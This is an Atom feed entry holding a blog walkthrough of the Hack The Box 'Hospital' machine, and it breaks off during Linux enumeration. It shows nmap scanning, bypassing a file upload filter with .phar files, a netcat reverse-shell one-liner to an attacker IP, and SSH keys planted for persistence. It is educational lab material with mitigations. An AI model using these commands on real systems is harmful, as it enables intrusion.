<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-04-08T08:18:02+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">Hospital</title><link href="https://emdeh.github.io/blog/2024/hospital-walkthrough/" rel="alternate" type="text/html" title="Hospital"/><published>2024-04-08T14:14:00+00:00</published><updated>2024-04-08T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/hospital-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/hospital-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Hospital is rated as a medium difficulty Windows machine. The kill chain was extensive. After registering a fraudulent account on a web frontend, an Insecure File Upload vulnerability that exploited to upload a malicious filetype, leading to initial access on a Linux webserver.</p> <p>An unpatched vulnerability in the Linux kernel was then exploited elevate privileges and steal hashes. Cracking the hashes led to unauthorised access of a business email account. The use of unpatched software was then exploited to breakout of the Linux webserver and obtain a shell on a Windows machine.</p> <p>From there, insecure coding practices had hardcoded a password in a batch script. The presence of a local administrator account and inappropriate file permissions resulted in obtaining <code class="language-plaintext highlighter-rouge">NT Authority</code> system access.</p> <p>The machine clearly demonstrates how various vulnerabilities can be chained together to ultimately become greater than the sum of their parts.</p> <hr/> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h4 id="insecure-file-upload">Insecure File Upload</h4> <p>Allows attackers to upload malicious files to a server, which can lead to unauthorised access or code execution. Mitigation involves strict validation of file types, sizes, and content, alongside implementing secure upload directories.</p> <h4 id="weak-credentials">Weak credentials</h4> <p>Use of easily guessed or default credentials, making unauthorised access simpler. Mitigation includes enforcing strong password policies and educating users about secure password practices.</p> <h4 id="unpatched-operating-systems">Unpatched Operating systems</h4> <p>Exploits known vulnerabilities in outdated operating systems; in this case, the Linux kernel. Regularly updating and patching operating systems and software mitigates this.</p> <h4 id="command-injections">Command injections</h4> <p>Occurs when an application passes unsafe user-supplied data to a system shell. Mitigation involves validating and sanitising all user inputs and using secure coding practices to avoid execution of untrusted commands.</p> <h4 id="remote-code-execution">Remote code execution</h4> <p>Allows an attacker to execute arbitrary code on a victim’s system. Mitigation strategies include keeping software up to date, employing least privilege principles, and using firewalls and intrusion detection/prevention systems.</p> <h4 id="insecure-coding">Insecure coding</h4> <p>Vulnerabilities introduced by errors or poor practices in software development. Mitigation involves using secure coding practices, regular code reviews, and automated security scanning.</p> <p>Improperly configured file or directory permissions that give unauthorised access. Regular audits and correctly setting permissions based on the principle of least privilege and separation of duties can mitigate this.</p> <h4 id="local-administrator-accounts">Local administrator accounts</h4> <p>Local accounts with high privileges not being properly managed or disabled. Best practices include disabling unnecessary accounts and using centralised authentication methods like Active Directory and LAPS.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap">Nmap</a></li> <li>Dirsearch</li> <li>Burpsuite</li> <li><a href="https://github.com/flozz/p0wny-shell/tree/master">PHP WebShell</a></li> <li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">Linux Kernel exploit for initial privilege escalation</a></li> <li>Hashcat for password cracking</li> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">CVE-2023-36664 exploit for command injection</a></li> <li>Evil-winrm</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h4 id="exploiting-insecure-code">Exploiting insecure code</h4> <ul> <li><strong>File Upload</strong>: Utilised to upload a <code class="language-plaintext highlighter-rouge">.phar</code> file, exploiting insecure file upload handling.</li> <li><strong>Hardcoded Password</strong>: Identified in a batch script, demonstrating insecure coding practices.</li> </ul> <h4 id="stealing-hashes-and-exploiting-weak-credentials">Stealing hashes and exploiting weak credentials</h4> <ul> <li><strong>Hash Stealing</strong>: Stole system hashes from the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</li> <li><strong>Weak credentials:</strong> Cracking them to revealed weak credentials.</li> </ul> <h4 id="business-email-compromise">Business email compromise</h4> <ul> <li><strong>Email Compromise</strong>: Achieved by exploiting weak credentials to access Dr. Williams’ email, illustrating the danger of weak passwords and the effectiveness of password cracking.</li> </ul> <h4 id="exploiting-unpatched-vulnerabilities">Exploiting unpatched vulnerabilities</h4> <ul> <li><strong>Linux Kernel Exploit (CVE-2023-2640-CVE-2023-32629)</strong>: Leveraged to gain elevated privileges through an unpatched kernel vulnerability.</li> <li><strong>Command Injection (CVE-2023-36664)</strong>: Used to inject and execute malicious commands in GhostScript, demonstrating the risk of unpatched software.</li> </ul> <h4 id="establishing-persistence">Establishing persistence</h4> <ul> <li><strong>Malicious SSH Keys</strong>: Added to ensure persistent access, highlighting the importance of securing authentication mechanisms.</li> </ul> <h4 id="exploiting-folder-permissions-and-local-administrator-account">Exploiting folder permissions and local administrator account</h4> <ul> <li><strong>Inappropriate Permissions</strong>: Exploited to achieve <code class="language-plaintext highlighter-rouge">NT Authority</code> system access, underscoring the need for proper file and directory permission settings.</li> <li><strong>Local Admin Account</strong>: Utilised to grab the root flag to demonstrate access, showcasing the risks associated with not disabling unnecessary administrator accounts.</li> </ul> <h1 id="enumeration">Enumeration</h1> <h2 id="nmap-scanning">Nmap scanning</h2> <p>As always, we begin with an nmap scan.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-v</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt   
</code></pre></div></div> <p><strong><em>A note on <code class="language-plaintext highlighter-rouge">-A</code></em></strong></p> <ul> <li><em><code class="language-plaintext highlighter-rouge">-A</code> is a comprehensive scan. It stands for “aggressive scan” and combines several advanced scanning features in one command. Specifically, it enables OS detection (<code class="language-plaintext highlighter-rouge">-O</code>), version detection (<code class="language-plaintext highlighter-rouge">-sV</code>), script scanning (<code class="language-plaintext highlighter-rouge">-sC</code>), and traceroute (<code class="language-plaintext highlighter-rouge">--traceroute</code>).</em></li> <li><em>When you use <code class="language-plaintext highlighter-rouge">-A</code>, <code class="language-plaintext highlighter-rouge">nmap</code> not only performs a script scan with the default scripts (as <code class="language-plaintext highlighter-rouge">-sC</code> does) but also tries to identify the operating system of the target, determine service/version information more aggressively, and maps out the path packets take to the host.</em></li> <li><em>Using <code class="language-plaintext highlighter-rouge">-A</code> is a good choice when you want a comprehensive overview of the target, but it’s more intrusive and might be detected more easily by intrusion detection systems (IDS) than using <code class="language-plaintext highlighter-rouge">-sC</code> alone. Always ensure you have authorization to perform such scans on the network you’re investigating.</em> &lt;/small&gt;</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-19 04:09 EDT
NSE: Loaded 156 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating Ping Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>2 ports]
Completed Ping Scan at 04:09, 0.32s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.00s elapsed
Initiating Connect Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>1000 ports]
Discovered open port 3389/tcp on 10.129.82.144
Discovered open port 22/tcp on 10.129.82.144
Discovered open port 139/tcp on 10.129.82.144
Discovered open port 445/tcp on 10.129.82.144
Discovered open port 8080/tcp on 10.129.82.144
Discovered open port 135/tcp on 10.129.82.144
Discovered open port 443/tcp on 10.129.82.144
Discovered open port 53/tcp on 10.129.82.144
Discovered open port 3269/tcp on 10.129.82.144
Discovered open port 593/tcp on 10.129.82.144
Discovered open port 88/tcp on 10.129.82.144
Discovered open port 464/tcp on 10.129.82.144
Discovered open port 2107/tcp on 10.129.82.144
Discovered open port 2103/tcp on 10.129.82.144
Discovered open port 3268/tcp on 10.129.82.144
Discovered open port 389/tcp on 10.129.82.144
Discovered open port 636/tcp on 10.129.82.144
Discovered open port 1801/tcp on 10.129.82.144
Discovered open port 2179/tcp on 10.129.82.144
Discovered open port 2105/tcp on 10.129.82.144
Completed Connect Scan at 04:10, 31.97s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
Initiating Service scan at 04:10
Scanning 20 services on 10.129.82.144
Completed Service scan at 04:11, 64.47s elapsed <span class="o">(</span>20 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.129.82.144.
Initiating NSE at 04:11
Completed NSE at 04:12, 42.19s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 5.80s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Nmap scan report <span class="k">for </span>10.129.82.144
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 980 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-19 15:10:36Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-18T15:06:28
| Not valid after:  2024-09-17T15:06:28
| MD5:   f596:b381:3127:b856:8368:11d2:c493:ebad
|_SHA-1: 9445:fdff:334c:4ad8:2560:bdcc:4665:a871:ec50:4d6b
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-19T15:11:35+00:00
8080/tcp open  http              Apache httpd 2.4.55 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.55 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
Service Info: Host: DC<span class="p">;</span> OSs: Linux, Windows<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-03-19T15:11:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>145.01 seconds

</code></pre></div></div> <h3 id="findings">Findings</h3> <p>The scan returned an extensive list of possibilities. At first glance items of interest are:</p> <ol> <li> <p><strong>Mixed Operating Systems</strong>: The service information suggests a mixture of Linux and Windows operating systems. This is indicated by the presence of OpenSSH running on Ubuntu and various Microsoft services such as Active Directory LDAP, Windows RPC, and Terminal Services. This could the use of a Windows Subsystem for Linux.</p> </li> <li> <p><strong>Domain and Active Directory Services</strong>: The presence of services such as LDAP (ports 389, 636, 3268, 3269) with references to a domain (<code class="language-plaintext highlighter-rouge">hospital.htb</code>), Microsoft Windows Active Directory, and Kerberos (port 88) suggest that the target is functioning as a domain controller within a Windows Active Directory environment. This could provide avenues for exploiting attack vectors relating to domain-level vulnerabilities or misconfigurations.</p> </li> <li> <p><strong>Web Services</strong>: Ports 443 and 8080 are running web services (Apache httpd) with SSL, where port 443’s service is identified as a webmail system for “Hospital Webmail”. The presence of a login page on port 8080 (<code class="language-plaintext highlighter-rouge">login.php</code>) suggests a potential target for web-based attacks, such as SQL injection, brute-force login, or exploiting web application vulnerabilities.</p> </li> <li> <p><strong>Potential Entry Points</strong>: The open ports 22 (SSH) and 3389 (RDP) are traditional entry points for accessing a system. The reported versions may be worth exploring for known vulnerabilities as a means to gain initial access. More likely, however, is they could be used after stealing credentials from elsewhere.</p> </li> <li> <p><strong>Service Versions and Vulnerabilities</strong>: The version information for several services, such as OpenSSH 9.0p1 on Ubuntu and Apache httpd 2.4.56 on Windows is worth checking for known vulnerabilities.</p> </li> <li> <p><strong>Network Service Protocols</strong>: The open ports associated with Microsoft-specific services (e.g., netbios-ssn on port 139, microsoft-ds on 445, ncacn_http on 593) hint at possible SMB or RPC vulnerabilities that could be exploited for lateral movement or privilege escalation within the network.</p> </li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>Next, the domain is enumerated. First we add it to the hosts file to make it accessible.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.82.144 hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>Navigating to Port <code class="language-plaintext highlighter-rouge">8080</code> reveals a logon page, and a link to register an account.</p> <p><img src="/assets/img/2024-hospital/landing-page.png" alt="landing-page.png" class="auto-resize"/></p> <p>There is no validation on account registration, so a fraudulent account is created. <img src="/assets/img/2024-hospital/registration-page.png" alt="registration-page.png" class="auto-resize"/></p> <p>Logging in with the account, and a page is presented to upload medical records, suggesting the presence of a file upload vulnerability.</p> <p><img src="/assets/img/2024-hospital/file-upload-page.png" alt="file-upload-page.png" class="auto-resize"/></p> <h1 id="file-upload-enumeration">File upload enumeration</h1> <p>To begin, a test.jpg file is created and the results monitored in Burpsuite.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/exploits]
└─<span class="nv">$ </span><span class="nb">touch </span>test.jpg <span class="o">&amp;&amp;</span> <span class="nb">echo test</span> <span class="o">&gt;</span> test.jpg
</code></pre></div></div> <p>Burpsuite confirms the file was uploaded successfully.</p> <p><img src="/assets/img/2024-hospital/jpg-file-upload success.png" alt="jpg-file-upload success.png" class="auto-resize"/></p> <p>Given the backend appears to be <code class="language-plaintext highlighter-rouge">PHP</code>, a <code class="language-plaintext highlighter-rouge">PHP</code> file is tried next.</p> <p><img src="/assets/img/2024-hospital/php-file-test.png" alt="php-file-test.png" class="auto-resize"/></p> <p>It appears <code class="language-plaintext highlighter-rouge">PHP</code> files are disallowed. In this instance, a <code class="language-plaintext highlighter-rouge">PHAR</code> file can be tried.</p> <blockquote> <p><small> <em>A PHAR (PHP Archive) file is a packaging format for PHP applications, enabling entire PHP applications, including their supporting files, to be distributed and executed as a single archive file. Introduced in PHP 5.3, PHAR files are conceptually similar to Java’s JAR files, providing a way to distribute and deploy PHP applications easily.</em></small></p> <p><em>PHAR files can contain PHP code, HTML, images, and other resources needed by the application. They are designed to simplify deployment: instead of dealing with many files and directories, you only need to manage one PHAR file. This makes it easier to distribute, install, and update complex PHP applications.</em> &lt;/small&gt;</p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/exploits]
└─$ touch test.phar &amp;&amp; echo test &gt; test.phar
</code></pre></div></div> <p><img src="/assets/img/2024-hospital/phar-file-test.png" alt="phar-file-test.png" class="auto-resize"/></p> <p><strong><em>A note of .phar files</em></strong></p> <ul> <li>The <code class="language-plaintext highlighter-rouge">PHAR</code> file works, indicating an Insecure File Upload vulnerability due to insecure coding where the potentially malicious file extension has not been disallowed.</li> <li>To exploit this, a <code class="language-plaintext highlighter-rouge">phar</code> based shell can be crafted and uploaded. Navigating to the file will execute the payload. So understanding where the files upload to is required.</li> <li>Browsing to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory seems to indicate that location does not exist. Further directory enumeration is required to validate how the file upload vulnerability can be successfully exploited.</li> </ul> <p><img src="/assets/img/2024-hospital/uploads-404.png" alt="uploads-404.png" class="auto-resize"/></p> <h2 id="directory-enumeration">Directory enumeration</h2> <p>Dirsearch can be used to enumerate the directories.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(kali㉿kali)-[~/Documents/htb-machines/hospital/scans]
└─$ dirsearch -u http://hospital.htb:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/hospital/scans/reports/http_hospital.htb/_24-04-07_20-12-41.txt

Target: http://hospital.htb/

[20:12:41] Starting:

</code></pre></div></div> <p>The results differ from browser, showing a <strong>301 Moved Permanently</strong> and a <strong>403 forbidden</strong> status codes for `http://hospital.htb:8080/uploads/.</p> <p><img src="/assets/img/2024-hospital/uploads-redirect.png" alt="uploads-redirect.png" class="auto-resize"/></p> <h1 id="exploitation">Exploitation</h1> <p>Given the uploads folder is not directly accessible, trying to access the file directly rather than traversing the folder structure may work.</p> <p>Uploading a shell with a <code class="language-plaintext highlighter-rouge">.phar</code> extension appears to work briefly, with the shell caught for a moment, but then dropped. Browsing to the malicious file, an error message appears.</p> <p><img src="/assets/img/2024-hospital/dropped-shell.png" alt="dropped-shell.png" class="auto-resize"/></p> <p>Attempting a webshell is more successful, but command results are not returned and the attempts begin to return a 404 status code, indicating the file is no longer present.</p> <p><img src="/assets/img/2024-hospital/web-shell-fail.png" alt="web-shell-fail.png" class="auto-resize"/></p> <p>Trying the initial shell again now also returns a 404 code, which may indicate some sort of time-based file process mechanism.</p> <p><img src="/assets/img/2024-hospital/404-rev-shell.png" alt="404-rev-shell.png" class="auto-resize"/></p> <p>Returning tot he webshell responses, and attempting to redirecting them by forwarding it back to the terminal also fails.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.2 4321 &gt;/tmp/f
</code></pre></div></div> <p>Trying the command encoded in base-64 and url-encoding also fails. This indicates the problem is likely with the websehll itself.</p> <p>Trying a new shell from <a href="https://github.com/flozz/p0wny-shell/tree/master">flozz</a> is successful and a working webshell is obtained.</p> <p><img src="/assets/img/2024-hospital/webshell-success.png" alt="webshell-success.png" class="auto-resize"/></p> <p>Forwarding it back to the terminal is also successful.</p> <p><img src="/assets/img/2024-hospital/forward-webshell.png" alt="forward-webshell.png" class="auto-resize"/></p> <p>To stabilise the shell we can use the following command combination.</p> <p><img src="/assets/img/2024-hospital/stabilise-shell.png" alt="stabilise-shell.png" class="auto-resize"/></p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></strong>: <ul> <li>Launches a new Bash shell within a pseudo-terminal (PTY) session.</li> <li>Improves interaction with the shell (e.g., supports auto-completion, history).</li> <li>Makes the shell behave more like a local terminal.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></strong>: <ul> <li>Sets the terminal type to <code class="language-plaintext highlighter-rouge">xterm</code>, which is widely compatible and supports advanced features.</li> <li>Ensures that the terminal emulation behaves consistently.</li> <li>Enables colour support, cursor movement, and screen clearing commands.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">stty raw -echo</code></strong>: <ul> <li>Sets the terminal to raw mode, sending characters directly without processing.</li> <li>Disables local echo, preventing typed characters from being displayed twice.</li> <li>Ensures that input and output are sent and received as intended, without automatic newline handling or echoing.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">fg</code></strong>: <ul> <li>Brings the most recent background job (your shell) to the foreground.</li> <li>Necessary if the shell was backgrounded, especially after changing terminal settings.</li> <li>May require hitting Enter to see the prompt after execution.</li> </ul> </li> </ul> <p>After the last step hit return a few times to return the prompt.</p> <p>Looking in the <code class="language-plaintext highlighter-rouge">/uploads</code> file, there are no files, so regaining a shell may be difficult.</p> <h1 id="establishing-persistence-1">Establishing Persistence</h1> <p>To avoid having to re-do the initial steps in the event of a disconnected shell, malicious SSH keys can be placed on the target.</p> <p>First, the <code class="language-plaintext highlighter-rouge">~/.ssh</code> directory is created, and appropriate write permissions confirmed..</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.ssh
<span class="nb">ls</span>: cannot access <span class="s1">'/var/www/.ssh'</span>: No such file or directory
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">mkdir</span> ~/.ssh
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">touch</span> ~/.ssh/test <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"write access confirmed"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"no write access"</span>
write access confirmed
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">rm</span> ~/.ssh/test

</code></pre></div></div> <p>Then an SSH key pair is generated on the local machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-f</span> ctf_key
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">-t rsa</code>: Specifies the type of key to create, in this case, RSA.</li> <li><code class="language-plaintext highlighter-rouge">-b 2048</code>: Specifies the number of bits in the key, in this case, 2048 bits.</li> <li><code class="language-plaintext highlighter-rouge">-f ~/.ssh/ctf_key</code>: Specifies the filename of the key; replace <code class="language-plaintext highlighter-rouge">ctf_key</code> with a name that makes sense for your situation.</li> </ul> <p>The public key is then displayed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span><span class="nb">cat </span>ctf_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn96sRU5Epi8/8T&lt;SNIP&gt;
</code></pre></div></div> <p>On the target system , the malicious public key is appended to the <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>nano ~/.ssh/authorized_keys
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn&lt;SNIP&gt;
www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Now if the shell is dropped, it may be possible to easily regain access using SSH</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/Documents/htb-machines/hospital/persistence/ctf_key www-data@hospital.htb
</code></pre></div></div> <h1 id="system-enumeration">System enumeration</h1> <p>Checking sudo permissions for the <code class="language-plaintext highlighter-rouge">www-data</code> account requires a password.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data:
</code></pre></div></div> <p>However, a review of the Linux kernel version reveals an unpatched vulnerbaility.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
